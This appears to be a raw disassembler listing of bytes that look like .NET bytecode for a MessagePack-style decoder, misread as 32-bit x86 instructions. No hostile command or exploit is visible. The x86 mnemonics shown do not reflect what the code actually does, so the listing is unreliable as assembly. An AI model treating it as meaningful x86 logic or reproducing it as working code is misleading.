  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 bc             	add    %dh,-0x44(%edx)
  404e78:	28 00                	sub    %al,(%eax)
  404e7a:	70 73                	jo     0x404eef
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 e8             	add    %dh,-0x18(%edx)
  404f7d:	28 00                	sub    %al,(%eax)
  404f7f:	70 73                	jo     0x404ff4
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	00 40 55             	add    %al,0x55(%eax)
  4051c2:	00 00                	add    %al,(%eax)
  4051c4:	00 18                	add    %bl,(%eax)
